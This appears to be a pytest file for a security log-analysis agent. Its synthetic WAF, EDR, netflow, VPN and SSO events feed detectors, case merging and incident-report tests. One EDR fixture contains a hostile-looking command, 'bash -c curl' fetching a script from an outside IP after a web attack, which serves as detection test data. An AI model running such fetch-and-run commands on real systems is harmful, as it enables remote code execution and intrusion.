from __future__ import annotations

import json

from agent_py_agent.agent.log_analysis.analytics.detectors import run_soft_detectors
from agent_py_agent.agent.log_analysis.cases.case_store import CaseStore
from agent_py_agent.agent.log_analysis.models import EvidenceRef, Finding
from agent_py_agent.agent.log_analysis.reports import first_response_report_content, forensic_package_content
from agent_py_agent.agent.log_analysis.security.correlation import build_route_draft


def _events() -> list[dict]:
    events = [
        {
            "event_id": "waf-1",
            "event_time": "2026-04-30T10:00:00Z",
            "source_id": "waf-prod",
            "source_product": "waf",
            "event_class": "alert",
            "event_action": "detected",
            "severity": "high",
            "alert_type": "web_attack",
            "threat_name": "generic command execution",
            "uri": "/upload.php",
            "attacker_ip": "198.51.100.10",
            "victim_ip": "10.0.0.5",
            "raw_ref": "raw-waf:line-1",
        },
        {
            "event_id": "edr-1",
            "event_time": "2026-04-30T10:02:00Z",
            "source_id": "edr-prod",
            "source_product": "edr",
            "event_class": "process",
            "event_action": "process_start",
            "victim_ip": "10.0.0.5",
            "host": "web-01",
            "parent_process_name": "nginx",
            "process_name": "bash",
            "cmdline": "bash -c curl http://203.0.113.77/a.sh",
            "raw_ref": "raw-edr:line-7",
        },
        {
            "event_id": "net-1",
            "event_time": "2026-04-30T10:03:00Z",
            "source_id": "netflow-prod",
            "source_product": "netflow",
            "event_class": "network",
            "event_action": "connect",
            "src_ip": "10.0.0.5",
            "dst_ip": "203.0.113.77",
            "dst_port": 443,
            "rare": True,
            "raw_ref": "raw-net:line-2",
        },
        {
            "event_id": "vpn-1",
            "event_time": "2026-04-30T11:00:00Z",
            "source_id": "vpn-prod",
            "source_product": "vpn",
            "event_class": "auth",
            "event_action": "login",
            "event_outcome": "success",
            "user": "alice",
            "src_ip": "198.51.100.30",
            "country": "ZZ",
            "new_geo": True,
            "raw_ref": "raw-vpn:line-1",
        },
    ]
    for index in range(5):
        events.append(
            {
                "event_id": f"auth-fail-{index}",
                "event_time": f"2026-04-30T11:0{index}:00Z",
                "source_id": "sso-prod",
                "source_product": "sso",
                "event_class": "auth",
                "event_action": "login",
                "event_outcome": "failure",
                "user": "bob",
                "src_ip": "198.51.100.44",
                "raw_ref": f"raw-sso:line-{index}",
            }
        )
    events.append(
        {
            "event_id": "auth-success",
            "event_time": "2026-04-30T11:06:00Z",
            "source_id": "sso-prod",
            "source_product": "sso",
            "event_class": "auth",
            "event_action": "login",
            "event_outcome": "success",
            "user": "bob",
            "src_ip": "198.51.100.44",
            "host": "app-01",
            "raw_ref": "raw-sso:line-9",
        }
    )
    return events


def test_soft_detectors_emit_required_finding_fields():
    findings = run_soft_detectors(_events())
    detector_ids = {finding.detector_id for finding in findings}

    assert {
        "waf_attack_success_candidate",
        "web_to_process_anomaly",
        "vpn_new_geo_login",
        "bruteforce_then_success",
        "rare_egress_after_alert",
        "multi_source_weak_signal",
    }.issubset(detector_ids)

    for finding in findings:
        assert finding.hypothesis
        assert finding.confidence is not None and finding.confidence > 0
        assert finding.evidence_refs
        assert all(isinstance(ref, EvidenceRef) for ref in finding.evidence_refs)
        assert finding.gaps
        assert finding.next_queries
        assert finding.rule_version == "v1"


def test_findings_merge_to_case_and_low_confidence_only_records(tmp_path):
    store = CaseStore(tmp_path, min_case_confidence=0.6)
    findings = run_soft_detectors(_events())
    store.record_findings(findings)

    cases = store.list_cases()
    merged = max(cases, key=lambda item: len(item.finding_refs))
    assert len(merged.finding_refs) >= 3
    assert "10.0.0.5" in merged.entities["victim_ip"]
    assert any(item["detector_id"] == "waf_attack_success_candidate" for item in merged.attributes["finding_summaries"])

    low = Finding(
        finding_id="finding-low",
        detector_id="low_signal",
        risk_score=0.2,
        confidence=0.2,
        evidence_refs=[EvidenceRef(evidence_id="raw-low:line-1")],
        hypothesis="low confidence only",
        gaps=["needs more evidence"],
        next_queries=["query more"],
    )
    assert store.record_finding(low) is None
    assert store.store.get_finding("finding-low") is not None


def test_route_and_reports_separate_facts_inferences_gaps(tmp_path):
    store = CaseStore(tmp_path)
    findings = run_soft_detectors(_events())
    store.record_findings(findings)
    case = max(store.list_cases(), key=lambda item: len(item.finding_refs))

    route = build_route_draft(case)
    assert route.entry_candidates
    assert route.timeline
    assert route.impacted_entities
    assert route.facts
    assert route.inferences
    assert route.gaps
    assert route.next_queries

    report = first_response_report_content(case, route)
    assert "## Facts" in report
    assert "## Inferences" in report
    assert "## Gaps" in report

    package = json.loads(forensic_package_content(case, route, frozen=True))
    assert package["frozen"] is True
    assert package["facts"]
    assert package["inferences"]
    assert package["gaps"]
    assert package["evidence_refs"]
